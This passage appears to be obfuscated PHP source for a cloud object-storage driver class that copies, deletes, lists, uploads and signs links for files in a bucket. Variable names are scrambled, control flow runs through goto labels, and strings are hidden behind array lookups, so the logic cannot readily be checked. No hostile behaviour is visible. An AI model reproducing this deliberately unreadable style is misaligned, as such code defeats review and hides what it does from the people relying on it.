($a¸Ş—µ‘½´ !== !1) { return $this->getPathOuter($EãÓÊ‚›Õ); } return !1; } public function copyFile($c• Ø™£š”, $f¶ŸÂŞèæ, $Fí™ ôƒ„Œ = array()) { $B®±´¦äˆª =& $_SERVER[œÕÊİğö]; $cµİçÅãøè = $this->objectMeta($c• Ø™£š”); if (!$cµİçÅãøè) { return !1; } if ($cµİçÅãøè[$B®±´¦äˆª[88]] <= 1024 * 1024 * 200) { $cÜáÕŠ‚©å = $this->client->copyObject($this->bucket, $c• Ø™£š”, $this->bucket, $f¶ŸÂŞèæ, $B®±´¦äˆª[202], $Fí™ ôƒ„Œ); } else { $cÜáÕŠ‚©å = $this->client->multiCopyObject($this->bucket, $c• Ø™£š”, $this->bucket, $f¶ŸÂŞèæ, $Fí™ ôƒ„Œ); } $cÜáÕŠ‚©å = $cÜáÕŠ‚©å ? $this->getPathOuter($f¶ŸÂŞèæ) : !1; return $cÜáÕŠ‚©å; } public function moveFile($B‹øˆŸöò, $fùèë°½ó¸) { if ($this->copyFile($B‹øˆŸöò, $fùèë°½ó¸)) { $this->delFile($B‹øˆŸöò); return $this->getPathOuter($fùèë°½ó¸); } return !1; } public function delFile($dë½²Áâó£) { return $this->client->deleteObject($this->bucket, $dë½²Áâó£); } public function delFolder($D·¼ë¨à¬) { goto fŸ°°ï†¦½; f½áÔİĞÂÎ: $A³é÷ÜÔœ = $this->fileList($D·¼ë¨à¬); $this->listItemCache = !0; $dİŞŠ‘âïŠ = trim($D·¼ë¨à¬, $Eàˆøî«Ë™[8]) . $Eàˆøî«Ë™[8]; goto c¢¤ÏèÃ©Ğ; eŸ‹’¤Í²é: $Fó¨ÃöÂ = $this->delByBatch($A³é÷ÜÔœ[$Eàˆøî«Ë™[85]]); if (!$Fó¨ÃöÂ) { return !1; } return $this->delFile($dİŞŠ‘âïŠ); goto F ‚ÕéŸ‘; fŸ°°ï†¦½: $Eàˆøî«Ë™ =& $_SERVER[œÕÊİğö]; if (!$this->exist($D·¼ë¨à¬)) { return !0; } $this->listItemCache = !1; goto f½áÔİĞÂÎ; c¢¤ÏèÃ©Ğ: if (!empty($D·¼ë¨à¬) && $D·¼ë¨à¬ !== $Eàˆøî«Ë™[201] && !in_array($dİŞŠ‘âïŠ, $A³é÷ÜÔœ[$Eàˆøî«Ë™[85]])) { $A³é÷ÜÔœ[$Eàˆøî«Ë™[85]][] = $dİŞŠ‘âïŠ; } $Fó¨ÃöÂ = $this->delByBatch($A³é÷ÜÔœ[$Eàˆøî«Ë™[84]]); if (!$Fó¨ÃöÂ) { return !1; } goto eŸ‹’¤Í²é; F ‚ÕéŸ‘: } private function delByBatch($E„ƒÑö´å) { foreach (array_chunk($E„ƒÑö´å, 1000) as $A‰àÇé†Ì) { $b¸ôëö¿ = $this->client->deleteObjects($this->bucket, $A‰àÇé†Ì); if (!$b¸ôëö¿) { return !1; } } return !0; } public function rename($Bš„À„ØÑ¼, $dæÓÍ“ëœõ) { return $this->renameObject($Bš„À„ØÑ¼, $dæÓÍ“ëœõ); } public function listPath($b… ³ß•èè, $f¬¬¸œƒ¥æ = false) { $fÅÎ¹Ìé =& $_SERVER[œÕÊİğö]; $fë¢½ë§Î = $this->fileList($b… ³ß•èè, $fÅÎ¹Ìé[8], !0); foreach ($fë¢½ë§Î[$fÅÎ¹Ìé[85]] as $a¤Àãƒ—Ó => $dÀ‚Çã‚Ôß) { $fë¢½ë§Î[$fÅÎ¹Ìé[85]][$a¤Àãƒ—Ó] = $this->folderInfo($dÀ‚Çã‚Ôß, $f¬¬¸œƒ¥æ); } foreach ($fë¢½ë§Î[$fÅÎ¹Ìé[84]] as $a¤Àãƒ—Ó => $dÀ‚Çã‚Ôß) { $fë¢½ë§Î[$fÅÎ¹Ìé[84]][$a¤Àãƒ—Ó] = $this->fileInfo($dÀ‚Çã‚Ôß[$fÅÎ¹Ìé[38]], $f¬¬¸œƒ¥æ, $dÀ‚Çã‚Ôß); } return $fë¢½ë§Î; } private function fileInfo($E¸§â¶¾ö¡, $Dâ±Õ¡¯•¨ = false, $Fïœ§‚˜¿ = array()) { goto Cöç†Ší‡; C†—Ë‹ù†: $eàØÇâ¨õµ[$f¡¿¡–ò‡[204]] = $eàØÇâ¨õµ[$f¡¿¡–ò‡[94]] = 0; $eàØÇâ¨õµ[$f¡¿¡–ò‡[205]] = $eàØÇâ¨õµ[$f¡¿¡–ò‡[206]] = !0; if (empty($Fïœ§‚˜¿)) { $Fïœ§‚˜¿ = $this->objectMeta($E¸§â¶¾ö¡); if (!$Fïœ§‚˜¿) { return $eàØÇâ¨õµ; } } goto a¢ÂİÙÎÜ; Cöç†Ší‡: $f¡¿¡–ò‡ =& $_SERVER[œÕÊİğö]; $eàØÇâ¨õµ = array($f¡¿¡–ò‡[38] => $this->pathThis($E¸§â¶¾ö¡), $f¡¿¡–ò‡[86] => $this->getPathOuter($E¸§â¶¾ö¡), $f¡¿¡–ò‡[39] => $f¡¿¡–ò‡[203], $f¡¿¡–ò‡[178] => $this->ext($E¸§â¶¾ö¡), $f¡¿¡–ò‡[88] => isset($Fïœ§‚˜¿[$f¡¿¡–ò‡[88]]) ? $Fïœ§‚˜¿[$f¡¿¡–ò‡[88]] : 0); if ($Dâ±Õ¡¯•¨) { return $eàØÇâ¨õµ; } goto C†—Ë‹ù†; a¢ÂİÙÎÜ: if (isset($Fïœ§‚˜¿[$f¡¿¡–ò‡[207]])) { $eàØÇâ¨õµ[$f¡¿¡–ò‡[94]] = $Fïœ§‚˜¿[$f¡¿¡–ò‡[207]]; } if (isset($Fïœ§‚˜¿[$f¡¿¡–ò‡[88]])) { $eàØÇâ¨õµ[$f¡¿¡–ò‡[88]] = $Fïœ§‚˜¿[$f¡¿¡–ò‡[88]]; } return $eàØÇâ¨õµ; goto eí‚îîîÇï; eí‚îîîÇï: } private function folderInfo($CÑ„ÒÎœÃ , $cµÙâ³Ÿ‹‡ = false) { goto F®×’İù«½; F®×’İù«½: $B©Û†½ßË =& $_SERVER[œÕÊİğö]; $C¥ãêïª¯ = array($B©Û†½ßË[38] => $this->pathThis($CÑ„ÒÎœÃ ), $B©Û†½ßË[86] => $this->getPathOuter($B©Û†½ßË[8] . $CÑ„ÒÎœÃ ), $B©Û†½ßË[39] => $B©Û†½ßË[87]); if ($cµÙâ³Ÿ‹‡) { return $C¥ãêïª¯; } goto f“¿ÓãŞ‚’; A£Üš¥èİ: $CÑ„ÒÎœÃ  = trim($CÑ„ÒÎœÃ , $B©Û†½ßË[8]) . $B©Û†½ßË[8]; $f¤Êø–ÄŸë = $this->objectMeta($CÑ„ÒÎœÃ ); if (isset($f¤Êø–ÄŸë[$B©Û†½ßË[207]])) { $C¥ãêïª¯[$B©Û†½ßË[204]] = $f¤Êø–ÄŸë[$B©Û†½ßË[207]]; } goto bŒÇœ†Ãä; f“¿ÓãŞ‚’: $C¥ãêïª¯[$B©Û†½ßË[204]] = $C¥ãêïª¯[$B©Û†½ßË[94]] = 0; $C¥ãêïª¯[$B©Û†½ßË[205]] = $C¥ãêïª¯[$B©Û†½ßË[206]] = !0; if ($CÑ„ÒÎœÃ  == $B©Û†½ßË[43]) { return $C¥ãêïª¯; } goto A£Üš¥èİ; bŒÇœ†Ãä: return $C¥ãêïª¯; goto FËšğ¡‹­; FËšğ¡‹­: } private function fileList($c¦†ÁÖÙÊİ, $fÉó×¾¨â‚ = '', $dŒƒÅ¡Õã‰ = 0) { goto DÔ¢§‰¹š; c©¸µŠÒİÚ: foreach ($eÍ²ÆÈ°Ññ[$DÄí÷åĞˆ[208]] as $F±Š§Öİ“¾) { goto fÃ£ëˆµ‹È; c™öÄ¬ÅÚË: $BŞÔİÇ™Œ = $Aß—Ê‹¸Åñ == 0 && substr($AŠßÊóâ¯ß, strlen($AŠßÊóâ¯ß) - 1, 1) == $DÄí÷åĞˆ[8] ? !0 : !1; if ($DœÅà³Íï) { $this->cacheMethod($DÄí÷åĞˆ[209], $AŠßÊóâ¯ß, $BŞÔİÇ™Œ); $this->cacheMethod($DÄí÷åĞˆ[210], $AŠßÊóâ¯ß, $F±Š§Öİ“¾); } if ($BŞÔİÇ™Œ) { $cëçÁÅêÍ©[] = $AŠßÊóâ¯ß; continue; } goto c¶®…¥¤í; fÃ£ëˆµ‹È: $AŠßÊóâ¯ß = $F±Š§Öİ“¾[$DÄí÷åĞˆ[38]]; if ($AŠßÊóâ¯ß == $F§½èêöÛ…) { continue; } $Aß—Ê‹¸Åñ = isset($F±Š§Öİ“¾[$DÄí÷åĞˆ[88]]) ? $F±Š§Öİ“¾[$DÄí÷åĞˆ[88]] : 0; goto c™öÄ¬ÅÚË; c¶®…¥¤í: $C¨…°§´§[] = $dŒƒÅ¡Õã‰ ? $F±Š§Öİ“¾ : $AŠßÊóâ¯ß; goto CÖ»Ñáô†„; CÖ»Ñáô†„: } foreach ($eÍ²ÆÈ°Ññ[$DÄí÷åĞˆ[211]] as $F±Š§Öİ“¾) { $cëçÁÅêÍ©[] = $F±Š§Öİ“¾[$DÄí÷åĞˆ[38]]; if ($DœÅà³Íï) { $this->cacheMethod($DÄí÷åĞˆ[209], $F±Š§Öİ“¾[$DÄí÷åĞˆ[38]], !0); } } if ($DœÅà³Íï) { $this->cacheMethod($DÄí÷åĞˆ[209], $c¦†ÁÖÙÊİ, !0); } goto Aâ¡ç‰; Aâ¡ç‰: return array($DÄí÷åĞˆ[85] => $cëçÁÅêÍ©, $DÄí÷åĞˆ[84] => $C¨…°§´§); goto a©§ôÌ§—²; DÔ¢§‰¹š: $DÄí÷åĞˆ =& $_SERVER[œÕÊİğö]; $F§½èêöÛ… = rtrim($c¦†ÁÖÙÊİ, $DÄí÷åĞˆ[8]) . $DÄí÷åĞˆ[8]; $eÍ²ÆÈ°Ññ = $this->listObjs($F§½èêöÛ…, null, null, $fÉó×¾¨â‚); goto f¨ÑâÛ¿; f¨ÑâÛ¿: if (!$eÍ²ÆÈ°Ññ) { return array($DÄí÷åĞˆ[85] => array(), $DÄí÷åĞˆ[84] => array()); } $DœÅà³Íï = $this->listItemCache === !1 ? !1 : !0; $cëçÁÅêÍ© = $C¨…°§´§ = array(); goto c©¸µŠÒİÚ; a©§ôÌ§—²: } private function listObjs($a‹¼´¼—ùí, $c™÷•×ƒÈ« = null, $b˜éÂ‚Ûµ¥ = null, $eçŠ‚À‡Š = null) { $Eš„áÔİŒ =& $_SERVER[œÕÊİğö]; $a‹¼´¼—ùí = trim($a‹¼´¼—ùí, $Eš„áÔİŒ[8]); $BäÈÇÑß‰È = empty($a‹¼´¼—ùí) && $a‹¼´¼—ùí !== $Eš„áÔİŒ[201] ? $Eš„áÔİŒ[43] : $a‹¼´¼—ùí . $Eš„áÔİŒ[8]; return $this->client->getBucket($this->bucket, $BäÈÇÑß‰È, $c™÷•×ƒÈ«, $b˜éÂ‚Ûµ¥, $eçŠ‚À‡Š, !0); } public function has($B«„Ê‹ö„µ, $bìˆ˜¹ª—Ğ = false, $dœíŞ¹Ûğ™ = true) { goto dì¬èØ°‰¦; AÁ±ù°¸´®: return !1; goto bÃ©™²Â´; dì¬èØ°‰¦: $d§‹ÏêäŸê =& $_SERVER[œÕÊİğö]; $B«„Ê‹ö„µ = trim($B«„Ê‹ö„µ, $d§‹ÏêäŸê[8]); $Bóó¼©îï = empty($B«„Ê‹ö„µ) && $B«„Ê‹ö„µ !== $d§‹ÏêäŸê[201] ? $d§‹ÏêäŸê[43] : $B«„Ê‹ö„µ . $d§‹ÏêäŸê[8]; goto F†ö¿Í§®¥; F†ö¿Í§®¥: $A±ßá“’ßĞ = null; $D¼ÜÁ–¹ = 500; $fæ¸Ù’¢†• = $d§‹ÏêäŸê[8]; goto A¥èÁµÅ÷³; A¥èÁµÅ÷³: $C™¸à†àºÓ = $BŸ¹„ºÏ = array(); while (!0) { $f‡‡™²òìá = $this->listObjs($B«„Ê‹ö„µ, $A±ßá“’ßĞ, $D¼ÜÁ–¹, $fæ¸Ù’¢†•); if (!$f‡‡™²òìá) { break; } $A±ßá“’ßĞ = $f‡‡™²òìá[$d§‹ÏêäŸê[212]]; $D§Ú„†õÛ = $f‡‡™²òìá[$d§‹ÏêäŸê[208]]; $Aëõ–·ÌÖ• = $f‡‡™²òìá[$d§‹ÏêäŸê[211]]; if (empty($D§Ú„†õÛ) && empty($Aëõ–·ÌÖ•)) { break; } if (count($D§Ú„†õÛ) == 1 && $D§Ú„†õÛ[0][$d§‹ÏêäŸê[38]] == $Bóó¼©îï) { break; } if ($bìˆ˜¹ª—Ğ) { if (count($D§Ú„†õÛ)) { $D§Ú„†õÛ = array_column($D§Ú„†õÛ, $d§‹ÏêäŸê[38]); $C™¸à†àºÓ = array_merge($C™¸à†àºÓ, $D§Ú„†õÛ); } if (count($Aëõ–·ÌÖ•)) { $Aëõ–·ÌÖ• = array_column($Aëõ–·ÌÖ•, $d§‹ÏêäŸê[38]); $BŸ¹„ºÏ = array_merge($BŸ¹„ºÏ, $Aëõ–·ÌÖ•); } if ($A±ßá“’ßĞ === null) { break; } continue; } if ($dœíŞ¹Ûğ™) { if (!empty($D§Ú„†õÛ)) { if (count($D§Ú„†õÛ) > 1 || isset($D§Ú„†õÛ[0][$d§‹ÏêäŸê[38]]) && $D§Ú„†õÛ[0][$d§‹ÏêäŸê[38]] != $Bóó¼©îï) { return !0; } } } else { if (!empty($Aëõ–·ÌÖ•)) { return !0; } } if ($A±ßá“’ßĞ === null) { break; } } if ($bìˆ˜¹ª—Ğ) { $C™¸à†àºÓ = array_diff($C™¸à†àºÓ, array($Bóó¼©îï)); $C™¸à†àºÓ = count(array_unique($C™¸à†àºÓ)); $BŸ¹„ºÏ = count(array_unique($BŸ¹„ºÏ)); return array($d§‹ÏêäŸê[213] => $C™¸à†àºÓ, $d§‹ÏêäŸê[214] => $BŸ¹„ºÏ); } goto AÁ±ù°¸´®; bÃ©™²Â´: } public function listAll($dÌ‘Şâóë) { $BÛ¦Ş²ì¦Ã =& $_SERVER[œÕÊİğö]; $b¿ÒÉÍ˜½ = $this->fileList($dÌ‘Şâóë, $BÛ¦Ş²ì¦Ã[43], !0); $D»±„ë“´˜ = array(); foreach ($b¿ÒÉÍ˜½[$BÛ¦Ş²ì¦Ã[84]] as $cåòÇ‡ê¶È) { $D»±„ë“´˜[$cåòÇ‡ê¶È[$BÛ¦Ş²ì¦Ã[38]]] = $cåòÇ‡ê¶È[$BÛ¦Ş²ì¦Ã[88]]; } foreach ($b¿ÒÉÍ˜½[$BÛ¦Ş²ì¦Ã[85]] as $cåòÇ‡ê¶È) { if (is_string($cåòÇ‡ê¶È)) { $D»±„ë“´˜[$cåòÇ‡ê¶È] = 0; } } return $this->listAllFiles($dÌ‘Şâóë, array_keys($D»±„ë“´˜), $D»±„ë“´˜); } public function canRead($bğù«‹ø¾›) { $Açç”Óãè¦ =& $_SERVER[œÕÊİğö]; $FõÅ«Õ¹™ = $this->client->getAccessControlPolicy($this->bucket, $bğù«‹ø¾›); if (!$FõÅ«Õ¹™) { return !1; } return in_array($FõÅ«Õ¹™, array($Açç”Óãè¦[215], $Açç”Óãè¦[216], $Açç”Óãè¦[217])) ? !0 : !1; } public function canWrite($c¢åì¼Ù·ç) { $CÈĞ£åçîã =& $_SERVER[œÕÊİğö]; $c‡Ç¯Ã°¹¤ = $this->client->getAccessControlPolicy($this->bucket, $c¢åì¼Ù·ç); if (!$c‡Ç¯Ã°¹¤) { return !1; } return in_array($c‡Ç¯Ã°¹¤, array($CÈĞ£åçîã[215], $CÈĞ£åçîã[216])) ? !0 : !1; } public function getContent($a˜²¼®·²) { return $this->client->getObject($this->bucket, $a˜²¼®·²); } public function setContent($d°ƒØè«Ê, $B¡Œ¼…Á®µ = '', $fòß¥Úš¾ = false) { goto dçÛÇ³ÃÙà; cà°ÌÄ™Ñ¨: $e÷Ñ×ÒÏî” = $this->client->putObject($B¡Œ¼…Á®µ, $this->bucket, $d°ƒØè«Ê, $A˜Ş·ÅÍëŠ[202], array(), $e¢¡Àè‰Ñµ); if (!$e÷Ñ×ÒÏî”) { return !1; } if ($fòß¥Úš¾) { return !0; } goto Eï÷•Ç¹ÜÉ; dçÛÇ³ÃÙà: $A˜Ş·ÅÍëŠ =& $_SERVER[œÕÊİğö]; $d°ƒØè«Ê = $fòß¥Úš¾ ? trim($d°ƒØè«Ê, $A˜Ş·ÅÍëŠ[8]) . $A˜Ş·ÅÍëŠ[8] : $d°ƒØè«Ê; $e¢¡Àè‰Ñµ = get_file_mime(get_path_ext($d°ƒØè«Ê)); goto cà°ÌÄ™Ñ¨; Eï÷•Ç¹ÜÉ: $this->cacheMethod(null, null); $e÷Ñ×ÒÏî” = $this->copyFile($d°ƒØè«Ê, $d°ƒØè«Ê, array($A˜Ş·ÅÍëŠ[218] => $e÷Ñ×ÒÏî”[$A˜Ş·ÅÍëŠ[219]])); return $e÷Ñ×ÒÏî” ? !0 : !1; goto Aœ‰½˜§à±; Aœ‰½˜§à±: } public function fileSubstr($cå«èîÙË, $e¡à‰¥†ê, $cïÊÌƒŞ) { $EÉÒ™ªğÚ¸ = $e¡à‰¥†ê + $cïÊÌƒŞ - 1; return $this->client->getObject($this->bucket, $cå«èîÙË, array($_SERVER[œÕÊİğö][220] => "\142\171\164\145\163\x3d{$e¡à‰¥†ê}\x2d{$EÉÒ™ªğÚ¸}")); } public function upload($B™ƒñ«‚˜ƒ, $AÓêç¬ÂŞ¡, $C©‡¼Œó«ö = false, $F–ãà•Î± = REPEAT_REPLACE) { $b§´„ºÇùß =& $_SERVER[œÕÊİğö]; $aÊˆŒ‘°¤É = array($b§´„ºÇùß[218] => @md5_file($AÓêç¬ÂŞ¡)); $AäÎºë•İ = array($b§´„ºÇùß[221] => get_file_mime(get_path_ext($B™ƒñ«‚˜ƒ))); if (IO::size($AÓêç¬ÂŞ¡) <= 1024 * 1024 * 200) { $bÃ¡œ‘¯…Ö = $this->client->putObjectFile($AÓêç¬ÂŞ¡, $this->bucket, $B™ƒñ«‚˜ƒ, $b§´„ºÇùß[202], $aÊˆŒ‘°¤É, $AäÎºë•İ); return !empty($bÃ¡œ‘¯…Ö) ? $this->getPathOuter($B™ƒñ«‚˜ƒ) : !1; } $A¼ ¥×“™ = $this->client->multiUploadObject($AÓêç¬ÂŞ¡, $this->bucket, trim($B™ƒñ«‚˜ƒ, $b§´„ºÇùß[8]), $aÊˆŒ‘°¤É, $AäÎºë•İ); return $A¼ ¥×“™ ? $this->getPathOuter($B™ƒñ«‚˜ƒ) : !1; } public function download($a…–ĞƒÇ ‹, $f¿º¿èÄ‘„) { if (!@is_dir($this->pathFather($f¿º¿èÄ‘„)) && !IO::mkdir($this->pathFather($f¿º¿èÄ‘„))) { return !1; } $Cé‚‹—Çòá = $this->client->getObject($this->bucket, $a…–ĞƒÇ ‹, array(), $f¿º¿èÄ‘„); return $Cé‚‹—Çòá !== !1 ? $f¿º¿èÄ‘„ : !1; } public function link($CÃ¹£Ï´´°, $C‡ ¶Õ´ö‡ = array()) { $B°¨‚‘â =& $_SERVER[œÕÊİğö]; if ($this->signVer == $B°¨‚‘â[222]) { return $this->client->getAuthenticatedURL($this->bucket, $CÃ¹£Ï´´°, 3600 * 12, $C‡ ¶Õ´ö‡); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($CÃ¹£Ï´´°, $B°¨‚‘â[8]), 3600 * 12, $this->region, array(), !0, $C‡ ¶Õ´ö‡); } public function fileOut($b‘£Õ«ê, $F—¶ãáùö’ = false, $Fè‡õ±º¡À = false, $f‚§½±îİÊ = '') { goto FÆ£Â¬ïÏà; CòªŒ’Ÿùñ: $Dƒ‰ÎÅ‚¢ = get_file_mime(get_path_ext($Fè‡õ±º¡À)); if ($Dƒ‰ÎÅ‚¢ == $c÷»ôˆø«ò[223]) { return parent::fileOut($b‘£Õ«ê, $F—¶ãáùö’, $Fè‡õ±º¡À, $f‚§½±îİÊ); } $F—¶ãáùö’ = $F—¶ãáùö’ ? $c÷»ôˆø«ò[224] : $c÷»ôˆø«ò[225]; goto bÒ…¶ÁÑç¨; FÆ£Â¬ïÏà: $c÷»ôˆø«ò =& $_SERVER[œÕÊİğö]; if ($this->isFileOutServer()) { return $this->fileOutServer($b‘£Õ«ê, $F—¶ãáùö’, $Fè‡õ±º¡À, $f‚§½±îİÊ); } if (!$Fè‡õ±º¡À) { $Fè‡õ±º¡À = $this->pathThis($b‘£Õ«ê); } goto CòªŒ’Ÿùñ; bÒ…¶ÁÑç¨: $b¾â§—¡Ü† = array($c÷»ôˆø«ò[226] => $F—¶ãáùö’ . $c÷»ôˆø«ò[227] . rawurlencode($Fè‡õ±º¡À), $c÷»ôˆø«ò[228] => $Dƒ‰ÎÅ‚¢); $CÊÔù‡ˆÎç = $this->link($b‘£Õ«ê, $b¾â§—¡Ü†); $this->fileOutLink($CÊÔù‡ˆÎç); goto A§î›æ‰‘¦; A§î›æ‰‘¦: } public function fileOutServer($EâÖÀø”‰•, $BÚä¶¿çáñ = false, $fÇïË‰œ¢ = false, $F¾ØŸ¢éŸö = '') { parent::fileOut($EâÖÀø”‰•, $BÚä¶¿çáñ, $fÇïË‰œ¢, $F¾ØŸ¢éŸö); } public function fileOutImageServer($D¯ Ê•î­„, $FÛÏ™¦‚‰Ò = 250) { parent::fileOutImage($D¯ Ê•î­„, $FÛÏ™¦‚‰Ò); } public function hashMd5($DÅ»â‚Ä³Û, $CÛçºÏ÷ì = '') { $E²³ù†›à =& $_SERVER[œÕÊİğö]; $f‰¬óÆƒ©õ = $this->objectMeta($DÅ»â‚Ä³Û); if (!$f‰¬óÆƒ©õ) { return !1; } $CÛçºÏ÷ì = $CÛçºÏ÷ì ? $CÛçºÏ÷ì : _get($f‰¬óÆƒ©õ, $E²³ù†›à[229]); $CÛçºÏ÷ì = $CÛçºÏ÷ì ? $CÛçºÏ÷ì : _get($f‰¬óÆƒ©õ, $E²³ù†›à[219], $E²³ù†›à[43]); return $CÛçºÏ÷ì; } public function uploadFormData($AÖ¿Ó°´—, $d³‘Ëò¸¨¤ = 3600) { $dÎ…°Àù¸ =& $_SERVER[œÕÊİğö]; $b¼ëæ‡—È = $this->pathFather($AÖ¿Ó°´—); $c·ˆÓÒ×— = $this->client->getHttpUploadPostParams($this->bucket, $b¼ëæ‡—È, $dÎ…°Àù¸[202], $d³‘Ëò¸¨¤); return array_merge((array) $c·ˆÓÒ×—, array($dÎ…°Àù¸[185] => $this->getHost())); } public function multiUploadFormData($F•© ŸãŠ, $b…–ÕéÆ™ = 3600) { $F‚à¾éÕÄÑ =& $_SERVER[œÕÊİğö]; $F©ø¤Ğì” = gmdate($F‚à¾éÕÄÑ[230]); $cƒñó¡‰­ˆ = array(); $EĞõÎ—á = $this->client->getUploadId($this->bucket, $F•© ŸãŠ, $cƒñó¡‰­ˆ); if (!$EĞõÎ—á) { return !1; } return array($F‚à¾éÕÄÑ[231] => $EĞõÎ—á, $F‚à¾éÕÄÑ[185] => $this->getHost() . $F‚à¾éÕÄÑ[8] . $this->pathEncode($F•© ŸãŠ), $F‚à¾éÕÄÑ[232] => $F©ø¤Ğì”, $F‚à¾éÕÄÑ[103] => $F•© ŸãŠ); } public function multiUploadAuthData($b™¦±¨‚°, $D»¶öÓƒªÕ = array()) { goto C¯áŸÅË§’; C¯áŸÅË§’: $CÑ°ó“’ =& $_SERVER[œÕÊİğö]; $Eº×÷¨ ã½ = isset($D»¶öÓƒªÕ[$CÑ°ó“’[232]]) ? $D»¶öÓƒªÕ[$CÑ°ó“’[232]] : gmdate($CÑ°ó“’[230]); $a­”ÍÚáŒù = isset($D»¶öÓƒªÕ[$CÑ°ó“’[178]]) ? $D»¶öÓƒªÕ[$CÑ°ó“’[178]] : $CÑ°ó“’[43]; goto f«¹§ùö®Ë; f«¹§ùö®Ë: $eÜ £†•ë = $D»¶öÓƒªÕ[$CÑ°ó“’[103]]; unset($D»¶öÓƒªÕ[$CÑ°ó“’[103]]); if (isset($D»¶öÓƒªÕ[$CÑ°ó“’[233]])) { $D»¶öÓƒªÕ[$CÑ°ó“’[232]] = $Eº×÷¨ ã½; return $this->listUploadParts($eÜ £†•ë, $D»¶öÓƒªÕ); } goto c¿±ÂéŸ¼‰; c¿±ÂéŸ¼‰: $A•õÙ¸ÊÍù = array($CÑ°ó“’[234], $CÑ°ó“’[43], $CÑ°ó“’[129], $CÑ°ó“’[43], "\170\55\141\155\x7a\x2d\144\x61\164\x65\x3a{$Eº×÷¨ ã½}", $CÑ°ó“’[8] . $this->bucket . $CÑ°ó“’[8] . $this->pathEncode($eÜ £†•ë) . $a­”ÍÚáŒù); if (strpos($a­”ÍÚáŒù, $CÑ°ó“’[235]) === 0) { $A•õÙ¸ÊÍù[0] = $CÑ°ó“’[236]; } if (isset($D»¶öÓƒªÕ[$CÑ°ó“’[237]]) && $D»¶öÓƒªÕ[$CÑ°ó“’[237]] == $CÑ°ó“’[238]) { $A•õÙ¸ÊÍù[0] = $CÑ°ó“’[238]; } goto B³ÅÅ¬„ù; c®¯ÖĞ•Äà: if (strpos($a­”ÍÚáŒù, $CÑ°ó“’[235]) === 0) { return array($CÑ°ó“’[241] => $Dİ©‡Øİ‘ä, $CÑ°ó“’[232] => $Eº×÷¨ ã½); } return $Dİ©‡Øİ‘ä; goto C’İ‘Šªì‰; B³ÅÅ¬„ù: $eÒ‰¤ñ·Ş‰ = implode($CÑ°ó“’[15], $A•õÙ¸ÊÍù); $cÛÕìÔŸ£ = base64_encode(hash_hmac($CÑ°ó“’[239], $eÒ‰¤ñ·Ş‰, $this->secret, !0)); $Dİ©‡Øİ‘ä = $CÑ°ó“’[240] . $this->accessKey . $CÑ°ó“’[4] . $cÛÕìÔŸ£; goto c®¯ÖĞ•Äà; C’İ‘Šªì‰: } public function listUploadParts($bøÖáÙäÜõ, $EÑ¼·´Ú¸™ = array()) { goto b“·ŒñÉÉŸ; b†¿Œ—à†: $bÏó¼Áƒë¢ = $this->multiUploadAuthData($bøÖáÙäÜõ, $EÑ¼·´Ú¸™); if (empty($bÏó¼Áƒë¢)) { return !1; } return array($B§œ‘É„à‘[241] => $bÏó¼Áƒë¢, $B§œ‘É„à‘[232] => $EÑ¼·´Ú¸™[$B§œ‘É„à‘[232]], $B§œ‘É„à‘[243] => $C¬íèõÍ); goto B’ÇİÚĞíÊ; b“·ŒñÉÉŸ: $B§œ‘É„à‘ =& $_SERVER[œÕÊİğö]; $FÑÏƒ¨·â = str_replace($B§œ‘É„à‘[242], $B§œ‘É„à‘[43], $EÑ¼·´Ú¸™[$B§œ‘É„à‘[178]]); $C¬íèõÍ = $this->client->listParts($this->bucket, $bøÖáÙäÜõ, $FÑÏƒ¨·â); goto D¢ìæÓŠïª; D¢ìæÓŠïª: if (!$C¬íèõÍ) { return !1; } unset($EÑ¼·´Ú¸™[$B§œ‘É„à‘[233]], $EÑ¼·´Ú¸™[$B§œ‘É„à‘[237]]); $EÑ¼·´Ú¸™[$B§œ‘É„à‘[103]] = $bøÖáÙäÜõ; goto b†¿Œ—à†; B’ÇİÚĞíÊ: } public function getHost() { return parent::getHost() . $_SERVER[œÕÊİğö][8] . $this->bucket; } public function size($AÂé½‹÷Ğ) { $eä®ùÒË‹ = $this->objectMeta($AÂé½‹÷Ğ); return $eä®ùÒË‹ ? $eä®ùÒË‹[$_SERVER[œÕÊİğö][88]] : 0; } public function info($Fİ·—Œ¸ãœ) { if ($this->isFolder($Fİ·—Œ¸ãœ)) { return $this->folderInfo($Fİ·—Œ¸ãœ); } else { if ($this->isFile($Fİ·—Œ¸ãœ)) { return $this->fileInfo($Fİ·—Œ¸ãœ); } } return !1; } public function exist($fŠá‡„ßÀÔ) { return $this->isFile($fŠá‡„ßÀÔ) || $this->isFolder($fŠá‡„ßÀÔ); } public function isFile($BŠÙ¸›Å‰) { return !$this->isFolder($BŠÙ¸›Å‰) && $this->objectMeta($BŠÙ¸›Å‰); } public function isFolder($dÉÃæ±·ô) { return $this->cacheMethod($_SERVER[œÕÊİğö][209], $dÉÃæ±·ô); } protected function objectMeta($d£ªš¾ğºç) { return $this->cacheMethod($_SERVER[œÕÊİğö][210], $d£ªš¾ğºç); } protected function _objectMeta($C™ÑÏÚä„ƒ) { $CÎİâÅ«¬¸ =& $_SERVER[œÕÊİğö]; $C™ÑÏÚä„ƒ = rtrim($C™ÑÏÚä„ƒ, $CÎİâÅ«¬¸[8]); try { $f¡ğè‹›Šª = $this->client->getObjectInfo($this->bucket, $C™ÑÏÚä„ƒ); if (!isset($f¡ğè‹›Šª[$CÎİâÅ«¬¸[229]]) && isset($f¡ğè‹›Šª[$CÎİâÅ«¬¸[244]])) { $f¡ğè‹›Šª[$CÎİâÅ«¬¸[229]] = $f¡ğè‹›Šª[$CÎİâÅ«¬¸[244]]; } } catch (Exception $A‚÷‚ô›Â¬) { $f¡ğè‹›Šª = !1; } if (!$f¡ğè‹›Šª) { } return $f¡ğè‹›Šª; } protected function _isFolder($BŒ•Ãˆ’†‰) { goto a²©Îïëá·; Eğ×È†öÁÍ: $AÔ÷ˆºÉî‚ = $this->client->getBucket($this->bucket, $BŒ•Ãˆ’†‰, null, 1); if (empty($AÔ÷ˆºÉî‚[$AåÀ‰ÍŠØ[208]])) { return !1; } $fŠ„‘Ó«Ì = $AÔ÷ˆºÉî‚[$AåÀ‰ÍŠØ[208]][0][$AåÀ‰ÍŠØ[38]]; goto E¤¤Ã„º©«; a²©Îïëá·: $AåÀ‰ÍŠØ =& $_SERVER[œÕÊİğö]; $BŒ•Ãˆ’†‰ = rtrim($BŒ•Ãˆ’†‰, $AåÀ‰ÍŠØ[8]); if ($BŒ•Ãˆ’†‰ == $AåÀ‰ÍŠØ[43] || $BŒ•Ãˆ’†‰ == 